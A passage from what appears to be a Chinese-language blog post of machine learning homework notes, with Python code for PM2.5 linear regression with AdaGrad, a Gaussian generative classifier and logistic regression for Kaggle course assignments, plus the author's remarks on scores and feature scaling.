class="line">ff = open(<span class="string">'test.csv'</span>, <span class="string">'r'</span>, <span class="keyword">True</span>, <span class="string">'big5hkscs'</span>)</span><br><span class="line">fo = open(<span class="string">'ans.csv'</span>, <span class="string">'w'</span>, <span class="keyword">True</span>, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">dd = ff.readlines()</span><br><span class="line"></span><br><span class="line">print(<span class="string">'id,value'</span>, file=fo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dd:</span><br><span class="line">    line = i.split(<span class="string">','</span>)</span><br><span class="line">    <span class="comment"># print(line)</span></span><br><span class="line">    <span class="keyword">if</span>(line[<span class="number">1</span>].startswith(<span class="string">"PM2.5"</span>)):</span><br><span class="line">        a = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> line[<span class="number">2</span>:]:</span><br><span class="line">            a.append(float(j))</span><br><span class="line">        print(line[<span class="number">0</span>], <span class="string">','</span>, f(a), file=fo, sep=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>加了三次方，感觉要Overfitting…<br>哦 结果变得肥肠爆炸…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># read data</span></span><br><span class="line"></span><br><span class="line">ff = open(<span class="string">'train.csv'</span>, <span class="string">'r'</span>, <span class="keyword">True</span>, <span class="string">'big5hkscs'</span>);</span><br><span class="line">data_init = ff.readlines()</span><br><span class="line">total_line = len(data_init)<span class="number">-1</span></span><br><span class="line"><span class="comment"># total_line = 19</span></span><br><span class="line">total_type = <span class="number">18</span></span><br><span class="line"></span><br><span class="line">data = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(total_type)]</span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, total_line+<span class="number">1</span>): </span><br><span class="line">    <span class="comment"># print(i, data_init[i], end=' ')</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> data_init[i].split(<span class="string">','</span>)[<span class="number">3</span>:]: </span><br><span class="line">        <span class="comment"># print(j, end=' ')</span></span><br><span class="line">        <span class="keyword">if</span>(j.startswith(<span class="string">"NR"</span>)):</span><br><span class="line">            data[(i<span class="number">-1</span>)%total_type].append(<span class="number">0.0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data[(i<span class="number">-1</span>)%total_type].append(float(j))</span><br><span class="line">    <span class="comment"># print()</span></span><br><span class="line"><span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in data:</span></span><br><span class="line"><span class="comment">#     print(len(i))</span></span><br><span class="line"></span><br><span class="line">ff.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># init model without adagrad</span></span><br><span class="line"><span class="comment"># just consider one type</span></span><br><span class="line"></span><br><span class="line">learningrate = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">w = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>)]</span><br><span class="line">b = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">g = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>)]</span><br><span class="line">gb = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(data[9])</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(a)</span>:</span> <span class="comment"># calc y</span></span><br><span class="line">    y = b</span><br><span class="line">    <span class="comment"># print(len(a))</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        y += w[i]*a[i] + w[i+<span class="number">9</span>]*(a[i]**<span class="number">2</span>) + w[i+<span class="number">18</span>]*(a[i]**<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LF</span><span class="params">()</span>:</span> <span class="comment"># loss function</span></span><br><span class="line">    tot1, tot2 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, len(data[<span class="number">9</span>])<span class="number">-1</span>):</span><br><span class="line">        tot1 += data[<span class="number">9</span>][i]-f(data[<span class="number">9</span>][i<span class="number">-9</span>: i])</span><br><span class="line">        tot2 += (data[<span class="number">9</span>][i]-f(data[<span class="number">9</span>][i<span class="number">-9</span>: i]))**<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> tot1, tot2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpart</span><span class="params">()</span>:</span> <span class="comment"># get partial w_i,b</span></span><br><span class="line">    <span class="keyword">global</span> w, b, learningrate, g, gb</span><br><span class="line">    parw = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>)]</span><br><span class="line">    parb = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>, len(data[<span class="number">9</span>])<span class="number">-1</span>):</span><br><span class="line">        a = data[<span class="number">9</span>][i<span class="number">-9</span>: i]</span><br><span class="line">        tmp = data[<span class="number">9</span>][i]-f(a)</span><br><span class="line">        <span class="comment"># print('a = ', a, ' tmp = ', tmp, 'f(a) = ', f(a))</span></span><br><span class="line">        parb += <span class="number">-2</span>*(tmp)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">            parw[j] += <span class="number">-2</span>*tmp*a[j]</span><br><span class="line">            parw[j+<span class="number">9</span>] += <span class="number">-2</span>*tmp*a[j]*a[j]</span><br><span class="line">            parw[j+<span class="number">18</span>] += <span class="number">-2</span>*tmp*(a[j]**<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line">        g[i] += parw[i]**<span class="number">2</span></span><br><span class="line">    gb += parb**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(parw, parb)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line">        w[i]=w[i]-learningrate/np.sqrt(g[i])*parw[i]</span><br><span class="line">    b = b-learningrate/np.sqrt(gb)*parb</span><br><span class="line"></span><br><span class="line"><span class="comment"># main loop</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">times = <span class="number">10000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(times): </span><br><span class="line">    loss1, loss2 = LF()</span><br><span class="line">    print(loss2)</span><br><span class="line">    getpart()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(w, b)</span><br><span class="line">print(<span class="string">'----------------------'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read test data &amp; output result</span></span><br><span class="line">ff = open(<span class="string">'test.csv'</span>, <span class="string">'r'</span>, <span class="keyword">True</span>, <span class="string">'big5hkscs'</span>)</span><br><span class="line">fo = open(<span class="string">'ans.csv'</span>, <span class="string">'w'</span>, <span class="keyword">True</span>, <span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line">dd = ff.readlines()</span><br><span class="line"></span><br><span class="line">print(<span class="string">'id,value'</span>, file=fo)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dd:</span><br><span class="line">    line = i.split(<span class="string">','</span>)</span><br><span class="line">    <span class="comment"># print(line)</span></span><br><span class="line">    <span class="keyword">if</span>(line[<span class="number">1</span>].startswith(<span class="string">"PM2.5"</span>)):</span><br><span class="line">        a = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> line[<span class="number">2</span>:]:</span><br><span class="line">            a.append(float(j))</span><br><span class="line">        print(line[<span class="number">0</span>], <span class="string">','</span>, f(a), file=fo, sep=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><h2 id="hw2"><a href="#hw2" class="headerlink" title="hw2"></a>hw2</h2><p><a href="https://www.kaggle.com/c/ml2019spring-hw2" target="_blank" rel="noopener">https://www.kaggle.com/c/ml2019spring-hw2</a><br><a href="https://ntumlta2019.github.io/ml-web-hw2/" target="_blank" rel="noopener">作业说明</a></p><p>这就是一个Binary Classification，直接用X_train提出的特征就可以了</p><h3 id="Probabilistic-Generateive-Model"><a href="#Probabilistic-Generateive-Model" class="headerlink" title="Probabilistic Generateive Model"></a>Probabilistic Generateive Model</h3><p>假设是高斯分布来算的，所以不需要训练，秒出结果，得分也不太高<code>private:0.76047 public:0.76707</code><br>也不知道是不是我写挂了…</p><p>没错是我写挂了，这全是0吧…</p><p>ps.手写矩阵运算好麻烦啊，虽然也不长，但是种类太多，感觉不如C++方便，可能我都写C++写惯了，抽时间看一下numpy好了</p><p>probabilistic_generateive_model.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> pi, log, exp</span><br><span class="line"></span><br><span class="line">file_x = open(<span class="string">'X_train'</span>, <span class="string">'r'</span>)</span><br><span class="line">file_y = open(<span class="string">'Y_train'</span>, <span class="string">'r'</span>)</span><br><span class="line">file_xt = open(<span class="string">'X_test'</span>, <span class="string">'r'</span>)</span><br><span class="line">file_yt = open(<span class="string">'Y_test'</span>, <span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#x_train = y_train = x_test = []</span></span><br><span class="line"><span class="comment">#mu1 = mu2 = sigm = []</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deal_data</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(x)):</span><br><span class="line">        x[i]=x[i].split(<span class="string">','</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(x[i])):</span><br><span class="line">            x[i][j]=int(x[i][j])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> x_train, y_train, x_test</span><br><span class="line">    x_train = file_x.readlines()[<span class="number">1</span>:]</span><br><span class="line">    y_train = file_y.readlines()[<span class="number">1</span>:]</span><br><span class="line">    x_test = file_xt.readlines()[<span class="number">1</span>:]</span><br><span class="line">    </span><br><span class="line">    deal_data(x_train)</span><br><span class="line">    deal_data(y_train)</span><br><span class="line">    deal_data(x_test)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mult</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c.append([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b[<span class="number">0</span>])):</span><br><span class="line">            c[i].append(<span class="number">0</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(b)):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(len(b[<span class="number">0</span>])):</span><br><span class="line">                c[i][k] += a[i][j]*b[j][k]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mult_num</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c.append([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(a[i])):</span><br><span class="line">            c[i].append(a[i][j]*b)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c.append([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(a[<span class="number">0</span>])):</span><br><span class="line">            c[i].append(<span class="number">0</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(a[<span class="number">0</span>])):</span><br><span class="line">            c[i][j] = a[i][j]+b[i][j]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transpose</span><span class="params">(a)</span>:</span></span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a[<span class="number">0</span>])):</span><br><span class="line">        c.append([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(a)):</span><br><span class="line">            c[i].append(a[j][i])</span><br><span class="line">    <span class="keyword">return</span> c </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> x_train, y_train, x_test</span><br><span class="line">    <span class="keyword">global</span> n, n0, n1, dim, mu0, mu1, sigm, sigm0, sigm1, w, b</span><br><span class="line">    n = len(y_train)</span><br><span class="line">    n0 = n1 = <span class="number">0</span></span><br><span class="line">    dim = len(x_train[<span class="number">0</span>])</span><br><span class="line">    mu0 = []</span><br><span class="line">    mu1 = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dim):</span><br><span class="line">        mu0.append(<span class="number">0</span>)</span><br><span class="line">        mu1.append(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">if</span> y_train[i][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            n0+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(dim):</span><br><span class="line">                mu0[j] += x_train[i][j]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n1+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(dim):</span><br><span class="line">                mu1[j] += x_train[i][j]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dim):</span><br><span class="line">        mu0[i] /= n0</span><br><span class="line">        mu1[i] /= n1</span><br><span class="line">    </span><br><span class="line">    sigm0 = <span class="number">0</span></span><br><span class="line">    sigm1 = <span class="number">0</span></span><br><span class="line"><span class="comment">#    for i in range(dim):</span></span><br><span class="line"><span class="comment">#        sigm0.append(0)</span></span><br><span class="line"><span class="comment">#        sigm1.append(0)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        <span class="keyword">if</span> y_train[i][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(dim):</span><br><span class="line">                sigm0+=(x_train[i][j]-mu0[j])**<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(dim):</span><br><span class="line">                sigm1+=(x_train[i][j]-mu1[j])**<span class="number">2</span></span><br><span class="line">    </span><br><span class="line">    sigm0 /= n0</span><br><span class="line">    sigm1 /= n1</span><br><span class="line">    sigm = n0/(n0+n1)*sigm0 + n1/(n0+n1)*sigm1</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#change to vector</span></span><br><span class="line">        </span><br><span class="line">    w = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dim):</span><br><span class="line">        w.append((mu0[i]-mu1[i])/sigm)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dim):</span><br><span class="line">        mu0[i] = [mu0[i]]</span><br><span class="line">        mu1[i] = [mu1[i]]</span><br><span class="line">    </span><br><span class="line">    b0 = mult_num(mult(transpose(mu0), mu0), <span class="number">-0.5</span>/sigm)</span><br><span class="line">    b1 = mult_num(mult(transpose(mu1), mu1), <span class="number">0.5</span>/sigm)</span><br><span class="line">    b = add(b0, b1)</span><br><span class="line">    b = b[<span class="number">0</span>][<span class="number">0</span>]+log(n0/n1)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#    print(b)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    for i in range(dim):</span></span><br><span class="line"><span class="comment">#        sigm0[i] /= n0</span></span><br><span class="line"><span class="comment">#        sigm1[i] /= n1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sigmoid</span><span class="params">(z)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>/(<span class="number">1</span>+exp(-z))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_probability</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> w, b</span><br><span class="line">    z=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(dim):</span><br><span class="line">       z += w[i]*x[i]</span><br><span class="line">    z += b</span><br><span class="line">    <span class="keyword">return</span> sigmoid(z)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_predict</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> get_probability(x)&gt;<span class="number">0.5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'id,label'</span>, file=file_yt)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x_test)):</span><br><span class="line">        print(i+<span class="number">1</span>, get_predict(x_test[i]),sep=<span class="string">','</span>, file=file_yt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span>    </span><br><span class="line">    load_data()</span><br><span class="line">    print(<span class="string">'load_data() ok'</span>)</span><br><span class="line">    train()</span><br><span class="line">    print(<span class="string">'train() ok'</span>)</span><br><span class="line">    test()</span><br><span class="line">    print(<span class="string">'test() ok'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><h3 id="Logistic-Regression-Model"><a href="#Logistic-Regression-Model" class="headerlink" title="Logistic Regression Model"></a>Logistic Regression Model</h3><p>设$s(x)=\frac{1}{1+e^{-x}}$，那么$s’(x)=s(x)(1-s(x))$，反过来证明很简单，正推求导还是有些麻烦的<br>这个1w数据，又有很多浮点运算…实在是难顶…好慢…</p><p>哎，写了个Logistic Regression，train来train去，0还是太少了，我佛啦</p><p>我发现它每个几个就会出现一次结果非常糟的情况…</p><p>参考了下别人的代码魔改了一发，就是加上了AdaGrad，然后求偏微分的时候除总数，再加上Regularization</p><p>哇！ 我懂了！<br>有个肥肠肥肠肥肠肥肠肥肠肥肠肥肠肥肠肥肠重要的数据处理就是把一些范围肥肠大的数据范围变小，就除均值就可以了，在这里，有第0,1,3,4,5有关年龄，收入支出的部分范围特别大，把他范围缩小，然后再train就不会出现之前那样每个几个就会出现一次结果非常糟的情况了，train 30次就能得到<code>private:0.84363 public:0.84656</code></p><p>最高也就<code>private: 0.85345 public:0.85356</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span 